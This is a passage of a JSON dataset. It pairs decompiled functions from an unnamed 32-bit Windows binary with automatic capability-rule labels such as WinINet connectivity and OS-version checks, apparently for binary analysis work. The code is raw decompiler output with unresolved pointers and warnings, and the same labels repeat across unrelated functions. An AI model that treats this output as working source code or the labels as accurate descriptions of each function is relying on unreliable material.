}\n                        else {\ncode_r0x00044a2b:\n                            var_8ch = *var_88h - *var_84h;\n                            if (var_8ch == 0) {\n                                if (var_80h == 1) goto code_r0x00044aeb;\n                                var_8ch = *(var_88h + 1) - *(var_84h + 1);\n                                if (var_8ch == 0) {\n                                    if (var_80h == 2) goto code_r0x00044aeb;\n                                    var_8ch = *(var_88h + 2) - *(var_84h + 2);\n                                    if (var_8ch == 0) {\n                                        if ((var_80h == 3) || (var_8ch = *(var_88h + 3) - *(var_84h + 3),  var_8ch == 0)\n                                           ) goto code_r0x00044aeb;\n                                    }\n                                }\n                            }\n                            var_90h = 1;\n                            if (var_8ch < 1) {\n                                var_90h = -1;\n                            }\n                        }\n                        if (var_90h == 0) break;\n                    }\n                    if (var_2ch <= var_14h) break;\n                    if (var_30h < *(*(var_1ch + var_14h * 4) + 0x28)) {\n                        puVar2 = *(var_1ch + var_14h * 4);\n                        *0xb1c5a5f8 = *puVar2;\n                        *0xb1c5a5fc = puVar2[1];\n                        *0xb1c5a600 = puVar2[2];\n                        *0xb1c5a604 = puVar2[3];\n                        var_30h._0_2_ = *(*(var_1ch + var_14h * 4) + 0x28);\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00044b8f:\n    if (var_4h != NULL) {\n        (**0xb1c68594)(&var_4h);\n    }\n    if (var_1ch != 0) {\n        (**0xb1c68594)(&var_1ch);\n    }\n    if (var_10h != 0) {\n        (**0xb1c6859c)(arg_8h, var_10h);\n    }\n    if (var_24h != 0) {\n        (**0xb1c685ac)(arg_8h, var_24h);\n    }\n    if (var_20h != NULL) {\n        fcn.00035330(var_20h);\n    }\n    return 0xb1c5a5f8;\n}\n",
        "token_count": 2498
    },
    "00044c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00044c00(uint *arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, uint32_t *arg_2ch)\n\n{\n    uint *puVar1;\n    uint var_dch;\n    int32_t var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b0h;\n    uint var_ach;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_c0h = 0;\n    fcn.00078790(&var_bch, 0, 0x94);\n    var_d8h = 0;\n    var_c4h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = NULL;\n    var_9h = '\\0';\n    var_d4h = 0;\n    if ((*arg_2ch | arg_2ch[1]) != 0) {\n        var_d4h = (**0xb1c5b448)(*0xb1c5b5b4, *arg_2ch, arg_2ch[1], &var_d8h);\n    }\n    if ((var_d4h == 0) && (var_d8h != 0)) {\n        (**0xb1c68594)(&var_d8h);\n        return 0;\n    }\n    *arg_2ch = 0;\n    arg_2ch[1] = 0;\n    if (*arg_28h != 0) {\n        var_d4h = (**0xb1c5b454)(*0xb1c5b5b4, *arg_28h, &var_c4h);\n        if ((var_d4h != 0) || (var_c4h == 0)) {\n            *arg_28h = 0;\n        }\n        if (var_c4h != 0) {\n            (**0xb1c68594)(&var_c4h);\n        }\n    }\n    if (*arg_28h == 0) {\n        var_d4h = fcn.00044550(arg_10h, arg_ch, arg_28h, arg_14h, arg_18h, arg_1ch);\n        if (var_d4h != 0) goto code_r0x00044eca;\n        var_9h = '\\x01';\n        var_d4h = fcn.000445c0(*0xb1c5b5b4, arg_ch, arg_8h, arg_20h, 0xb1be1764);\n        if (var_d4h != 0) goto code_r0x00044eca;\n    }\n    var_b0h = arg_24h;\n    var_ach = 0xb1be1764;\n    var_98h = *arg_8h;\n    var_94h = arg_8h[1];\n    var_90h = arg_8h[2];\n    var_8ch = arg_8h[3];\n    puVar1 = fcn.00044650(*0xb1c5b5b4, arg_8h);\n    var_88h = *puVar1;\n    var_84h = puVar1[1];\n    var_80h = puVar1[2];\n    var_7ch = puVar1[3];\n    var_d0h = 0xffffffff;\n    var_cch = 0xffffffff;\n    var_78h = 4;\n    var_74h = &var_d0h;\n    var_68h = 0x4005;\n    var_64h = *arg_ch;\n    var_60h = arg_ch[1];\n    var_5ch = arg_ch[2];\n    var_58h = arg_ch[3];\n    var_6ch = &var_28h;\n    var_70h = 1;\n    var_28h = *0xb1bdef88;\n    var_24h = *0xb1bdef8c;\n    var_20h = *0xb1bdef90;\n    var_1ch = *0xb1bdef94;\n    var_18h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_14h = 0x100;\n    var_10h = &var_8h;\n    var_d4h = (**0xb1c5b444)(*0xb1c5b5b4, &var_c0h, 0, arg_2ch);\ncode_r0x00044eca:\n    if (var_d4h != 0) {\n        if (var_9h != '\\0') {\n            (**0xb1c5b440)(*arg_28h);\n        }\n        *arg_28h = 0;\n        *arg_2ch = 0;\n        arg_2ch[1] = 0;\n    }\n    return var_d4h;\n}\n",
        "token_count": 1396
    },
    "00045040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00045040(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint noname_3, uint32_t arg_18h, uint noname_5, \n            uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ushort extraout_var;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    var_14h = 0;\n    var_8h = NULL;\n    if ((arg_10h != NULL) && (iVar1 = *arg_10h,  iVar1 != 0)) {\n        arg_10h[4] = 0;\n        *arg_20h = 0x1002;\n        if ((*(*(arg_8h + 8) + 0x1c) != 0x8b) && ((arg_18h != 0 && (iVar2 = fcn.000463e0(arg_18h),  iVar2 != 0)))) {\n            fcn.00037150(arg_18h + 0x648, &var_ch, 1);\n            if ((*(arg_18h + 0x62c) == 3) || (*(arg_18h + 0x62c) == 1)) {\n                fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n            }\n            else if (*(arg_18h + 0x62c) == 2) {\n                arg_10h[3] = 0;\n                arg_10h[4] = 0;\n                *arg_20h = 0x1001;\n                var_14h = fcn.00035230(*(iVar1 + 0x1c));\n                var_4h = fcn.00035230(0x10);\n                if ((var_14h == 0) || (var_4h == NULL)) {\n                    fcn.00035330(var_14h);\n                    fcn.00035330(var_4h);\n                    fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n                }\n                else {\n                    *var_4h = 0;\n                    var_4h[1] = 0;\n                    var_4h[2] = 0;\n                    var_4h[3] = 0;\n                    var_4h[3] = var_14h;\n                    var_4h[2] = *(iVar1 + 0x1c);\n                    (**0xb1c5b45c)(iVar1, var_14h, *(iVar1 + 0x1c), &var_18h);\n                    if (*(arg_18h + 0x664) == 0) {\n                        *(arg_18h + 0x664) = var_4h;\n                    }\n                    else {\n                        for (var_8h = *(arg_18h + 0x664); *var_8h != NULL; var_8h = *var_8h) {\n                        }\n                        *var_8h = var_4h;\n                    }\n                    fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n                    (**0xb1bde0c0)(arg_18h + 0x654, 0, 0);\n                }\n            }\n            else if (*(*(arg_8h + 8) + 0x2c) == 0) {\n                *(arg_18h + 0x62c) = 1;\n                fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n            }\n            else {\n                var_14h = fcn.00035230(*(iVar1 + 0x1c));\n                if (var_14h == 0) {\n                    fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n                }\n                else {\n                    (**0xb1c5b45c)(iVar1, var_14h, *(iVar1 + 0x1c), &var_18h);\n                    if (*(iVar1 + 0x1c) < 0x1000) {\n                        var_28h = *(iVar1 + 0x1c);\n                    }\n                    else {\n                        var_28h = 0x1000;\n                    }\n                    var_10h = fcn.00049580(var_14h, var_28h, *(arg_18h + 0x630) == 0);\n                    *(arg_18h + 0x630) = *(arg_18h + 0x630) + *(iVar1 + 0x1c);\n                    if (var_10h == 0) {\n                        if (0x100 < *(arg_18h + 0x630)) {\n                            *(arg_18h + 0x62c) = 1;\n                        }\n                        fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n                    }\n                    else {\n                        arg_10h[3] = 0;\n                        arg_10h[4] = 0;\n                        *arg_20h = 0x1001;\n                        *(arg_18h + 0x62c) = 2;\n                        *(arg_18h + 0x634) = var_10h;\n                        *(arg_18h + 0x63c) = *0xb1c5b5b8;\n                        *(arg_18h + 0x640) = *(arg_ch + 0x20);\n                        *(arg_18h + 0x644) = *(arg_ch + 0x24);\n                        if (((((*(arg_18h + 0x634) == 5) || (*(arg_18h + 0x634) == 6)) || (*(arg_18h + 0x634) == 7)) ||\n                            ((*(arg_18h + 0x634) == 1 || (*(arg_18h + 0x634) == 2)))) ||\n                           ((*(arg_18h + 0x634) == 3 || ((*(arg_18h + 0x634) == 4 || (*(arg_18h + 0x634) == 0xb)))))) {\n                            var_4h = fcn.00035230(0x10);\n                            if (var_4h == NULL) {\n                                fcn.00035330(var_14h);\n                            }\n                            else {\n                                *var_4h = 0;\n                                var_4h[1] = 0;\n                                var_4h[2] = 0;\n                                var_4h[3] = 0;\n                                var_4h[3] = var_14h;\n                                var_4h[2] = *(iVar1 + 0x1c);\n                                *(arg_18h + 0x664) = var_4h;\n                                (**0xb1bde0c0)(arg_18h + 0x654, 0, 0);\n                                *(arg_18h + 0x6a4) = 0xb1c11f40;\n                                *(arg_18h + 0x6a8) = arg_18h;\n                                *(arg_18h + 0x69c) = 0;\n                                (**0xb1bde218)(arg_18h + 0x69c, 1);\n                                fcn.00045750(*(arg_18h + 0x624), arg_18h & 0xffff0000 | *(arg_18h + 0x628), \n                                             *(arg_18h + 0x61c), CONCAT22(extraout_var, *(arg_18h + 0x620)));\n                            }\n                        }\n                        else {\n                            fcn.00035330(var_14h);\n                        }\n                        fcn.00037180(arg_18h + 0x648, &var_ch, 1);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1860
    },
    "00045520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00045520(int16_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint *arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ushort extraout_var;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_20h = 0x1002;\n    if (*arg_8h == 0x34) {\n        if (*(*(arg_8h + 4) + 0x2c) == 6) {\n            fcn.00046640(*(*(arg_8h + 4) + 0x34), *(*(arg_8h + 4) + 0x14) & 0xffff0000 | *(*(arg_8h + 4) + 0x3c), \n                         *(*(arg_8h + 4) + 0x14), *(*(arg_8h + 4) + 0x24), *(*(arg_8h + 4) + 100));\n            iVar2 = fcn.00046290(*(*(arg_8h + 4) + 0x34), *(*(arg_8h + 4) + 0x14) & 0xffff0000 | *(*(arg_8h + 4) + 0x3c)\n                                 , *(*(arg_8h + 4) + 0x14), *(arg_ch + 0x20) & 0xffff0000 | *(*(arg_8h + 4) + 0x24), \n                                 *(arg_ch + 0x20), *(arg_ch + 0x24), CONCAT22(extraout_var, *(*(arg_8h + 4) + 100)));\n            if (iVar2 != 0) {\n                iVar3 = (**0xb1c5b458)(*(arg_ch + 0x20), *(arg_ch + 0x24), 0x14, *0xb1c5b5b8, iVar2, iVar2 >> 0x1f);\n                if (iVar3 != 0) {\n                    fcn.00046490(iVar2, 1);\n                }\n                if ((**(arg_8h + 4) == 0xc) && (piVar1 = *(*(arg_8h + 4) + 4),  *(piVar1[1] + -1 + *piVar1) == '\\0')) {\n                    var_ch = fcn.0007859e(piVar1[1], 0x5c);\n                    if (var_ch == 0) {\n                        var_ch = piVar1[1];\n                    }\n                    else {\n                        var_ch = var_ch + 2;\n                    }\n                    iVar2 = fcn.00037bc0(var_ch);\n                    if ((iVar2 != 0) && (puVar4 = fcn.00035230(0x10),  puVar4 != NULL)) {\n                        *puVar4 = 0;\n                        puVar4[1] = 0;\n                        puVar4[2] = 0;\n                        puVar4[3] = 0;\n                        puVar4[2] = 0xb1c12700;\n                        puVar4[3] = puVar4;\n                        *puVar4 = 0;\n                        (**0xb1bde218)(puVar4, 1);\n                    }\n                }\n            }\n        }\n        else {\n            *arg_20h = 0x2006;\n        }\n    }\n    else {\n        *arg_20h = 0x2006;\n    }\n    return;\n}\n",
        "token_count": 854
    },
    "00045720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00045720(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        fcn.00046490(arg_10h, 0);\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00045750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00045750(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    ushort uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint16_t extraout_var;\n    uint16_t extraout_var_00;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0xb1c5b644 != 0) && (puVar2 = fcn.00035230(0x10),  puVar2 != NULL)) {\n        uVar3 = fcn.00035490(arg_8h);\n        puVar2[1] = uVar3;\n        uVar3 = fcn.00035490(arg_10h);\n        puVar2[2] = uVar3;\n        uVar1 = fcn.000354c0(arg_ch & 0xffff | extraout_var << 0x10);\n        *(puVar2 + 3) = uVar1;\n        uVar1 = fcn.000354c0(arg_14h & 0xffff | extraout_var_00 << 0x10);\n        *(puVar2 + 0xe) = uVar1;\n        fcn.00037150(0xb1c5b648, &var_4h, 1);\n        *puVar2 = *0xb1c5b654;\n        *0xb1c5b654 = puVar2;\n        fcn.00037180(0xb1c5b648, &var_4h, 1);\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "000457f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000457f0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5b644 != 0) {\n        fcn.00037150(0xb1c5b648, &var_4h, 1);\n        var_8h = NULL;\n        for (var_ch = *0xb1c5b654; var_ch != NULL; var_ch = *var_ch) {\n            if ((((var_ch[1] == arg_8h) && (var_ch[2] == arg_10h)) && (*(var_ch + 3) == arg_ch)) &&\n               (*(var_ch + 0xe) == arg_14h)) {\n                if (var_8h == NULL) {\n                    *0xb1c5b654 = *var_ch;\n                }\n                else {\n                    *var_8h = *var_ch;\n                }\n            }\n            var_8h = var_ch;\n        }\n        fcn.00037180(0xb1c5b648, &var_4h, 1);\n        fcn.00035330(0);\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "000458d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000458d0(void)\n\n{\n    uint *arg_8h;\n    uint var_8h;\n    uint var_4h;\n    \n    *0xb1c5b644 = 0;\n    fcn.00037150(0xb1c5b648, &var_4h, 1);\n    while (arg_8h = *0xb1c5b654,  *0xb1c5b654 != NULL) {\n        *0xb1c5b654 = **0xb1c5b654;\n        fcn.00035330(arg_8h);\n    }\n    fcn.00037180(0xb1c5b648, &var_4h, 1);\n    return;\n}\n",
        "token_count": 165
    },
    "00045940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00045940(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00037150(0xb1c5b648, &var_8h, 0);\n    var_ch = *0xb1c5b654;\n    do {\n        if (var_ch == NULL) {\ncode_r0x000459b5:\n            fcn.00037180(0xb1c5b648, &var_8h, 0);\n            return var_4h;\n        }\n        if ((((var_ch[1] == arg_8h) && (var_ch[2] == arg_10h)) && (*(var_ch + 3) == arg_ch)) &&\n           (*(var_ch + 0xe) == arg_14h)) {\n            var_4h = 1;\n            goto code_r0x000459b5;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 253
    },
    "00045a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00045a50(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00045f30(arg_ch, arg_10h, *(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x63c));\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        (**0xb1bde0c0)(arg_8h + 0x668, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "00045b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n\nuint __cdecl fcn.00045b00(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    ulong uVar4;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    while( true ) {\n        var_24h = arg_8h + 0x654;\n        var_20h = arg_8h + 0x668;\n        uVar4 = fcn.00078778(arg_18h * -100, arg_18h * -100 >> 0x1f, 10000000, 0);\n        _var_18h = uVar4;\n        iVar2 = (**0xb1bde21c)(2, &var_24h, 1, 0, 0, 0, &var_18h, 0);\n        if (iVar2 == 1) {\n            return 1;\n        }\n        if (iVar2 == 0x102) {\n            return 0x102;\n        }\n        fcn.00037150(arg_8h + 0x648, &var_4h, 1);\n        if (*(arg_8h + 0x664) != 0) break;\n        fcn.00037180(arg_8h + 0x648, &var_4h, 1);\n    }\n    var_8h = *(arg_8h + 0x664);\n    var_10h = *(arg_8h + 0x664);\n    var_1ch = 0;\n    do {\n        if (var_10h == NULL) {\n            *(arg_8h + 0x664) = 0;\ncode_r0x00045ce7:\n            if (*(arg_8h + 0x664) != 0) {\n                (**0xb1bde0c0)(arg_8h + 0x654, 0, 0);\n            }\n            fcn.00037180(arg_8h + 0x648, &var_4h, 1);\n            if (var_8h != NULL) {\n                if (arg_10h < var_1ch) {\n                    var_40h = arg_10h;\n                }\n                else {\n                    var_40h = var_1ch;\n                }\n                *arg_14h = var_40h;\n                var_10h = var_8h;\n                for (var_ch = 0; (var_10h != NULL && (var_ch < *arg_14h)); var_ch = var_ch + *piVar1) {\n                    fcn.0007877e(arg_ch + var_ch, var_10h[3], var_10h[2]);\n                    piVar1 = var_10h + 2;\n                    var_10h = *var_10h;\n                }\n                var_38h = var_8h;\n                while (var_38h != NULL) {\n                    puVar3 = *var_38h;\n                    fcn.00035330(var_38h[3]);\n                    fcn.00035330(var_38h);\n                    var_38h = puVar3;\n                }\n                fcn.00045e20(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x63c));\n                fcn.00045ea0(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x63c));\n            }\n            return 0;\n        }\n        var_1ch = var_1ch + var_10h[2];\n        if (arg_10h <= var_1ch) {\n            if (var_1ch == arg_10h) {\n                *(arg_8h + 0x664) = *var_10h;\n                *var_10h = 0;\n            }\n            else {\n                arg_8h_00 = var_1ch - arg_10h;\n                puVar3 = fcn.00035230(0x10);\n                iVar2 = fcn.00035230(arg_8h_00);\n                if ((puVar3 != NULL) && (iVar2 != 0)) {\n                    *puVar3 = 0;\n                    puVar3[1] = 0;\n                    puVar3[2] = 0;\n                    puVar3[3] = 0;\n                    fcn.0007877e(iVar2, (var_10h[3] + var_10h[2]) - arg_8h_00, arg_8h_00);\n                    puVar3[3] = iVar2;\n                    puVar3[2] = arg_8h_00;\n                    *(arg_8h + 0x664) = puVar3;\n                    *puVar3 = *var_10h;\n                    var_10h[2] = var_10h[2] - arg_8h_00;\n                    *var_10h = 0;\n                }\n            }\n            goto code_r0x00045ce7;\n        }\n        var_10h = *var_10h;\n    } while( true );\n}\n",
        "token_count": 1413
    },
    "00045ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00045ea0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = (**0xb1c5b468)(*0xb1c5b620, 0, 0, 0, 0, 0, &var_8h);\n    if ((var_4h == 0) &&\n       (var_4h = (**0xb1c5b460)(*0xb1c5b61c, 0, 0, arg_8h, arg_ch, arg_10h, 0x14, 3, var_8h, 0, 0xb1c13110, 0), \n       var_4h == 0)) {\n        var_8h = 0;\n    }\n    if (var_8h != 0) {\n        (**0xb1c5b464)(var_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 244
    },
    "00045f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00045f30(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_18h;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45880;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffb8;\n    var_2ch = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_28h = (**0xb1bde294)(var_8h, var_ch, 0, 0, 0);\n    if (var_28h == 0) {\n        var_24h = -0x3fffff66;\n    }\n    else {\n        var_1ch = fcn.00035230(0x10);\n        if (var_1ch == 0) {\n            var_24h = -0x3fffff66;\n        }\n        else {\n            var_4h = 0;\n            (**0xb1bde2a0)(var_28h, 0, 0);\n            var_4h = 0xffffffff;\n            var_20h = 1;\n            var_24h = (**0xb1c5b468)(*0xb1c5b620, 0, 0, var_28h, 0, var_ch, &var_2ch);\n            if (var_24h == 0) {\n                (**0xb1bde0cc)(var_1ch, 1, 0);\n                var_24h = (**0xb1c5b460)(*0xb1c5b61c, 0, 0, var_10h, var_14h, var_18h_2, 0x14, 0x50000, var_2ch, var_ch\n                                         , 0xb1c13110, var_1ch);\n                if (var_24h == 0) {\n                    var_38h = 0x88ca6c00;\n                    var_34h = 0xffffffff;\n                    iVar1 = (**0xb1bde30c)(var_1ch, 0, 0, 0, &var_38h);\n                    if (iVar1 == 0x102) {\n                        var_24h = -0x3fffffff;\n                    }\n                    else {\n                        var_28h = 0;\n                        var_2ch = 0;\n                    }\n                }\n            }\n        }\n        if (var_28h != 0) {\n            if (var_20h != 0) {\n                (**0xb1bde29c)(var_28h);\n            }\n            (**0xb1bde2ac)(var_28h);\n        }\n        if (var_2ch != 0) {\n            (**0xb1c5b464)(var_2ch);\n        }\n        if (var_1ch != 0) {\n            fcn.00035330(var_1ch);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 872
    },
    "00046110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046110(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(arg_ch + 4) + 0x10);\n    if (iVar1 != 0) {\n        (**0xb1bde29c)(iVar1);\n        (**0xb1bde2ac)(iVar1);\n    }\n    (**0xb1c5b464)(arg_ch);\n    if (arg_8h != 0) {\n        (**0xb1bde0c0)(arg_8h, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00046170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00046170(void)\n\n{\n    if (*0xb1c5b66c == 0) {\n        fcn.00032200(0xb1c5b664);\n        fcn.00036f50(0xb1c5b658);\n        *0xb1c5b66c = 1;\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "000461a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
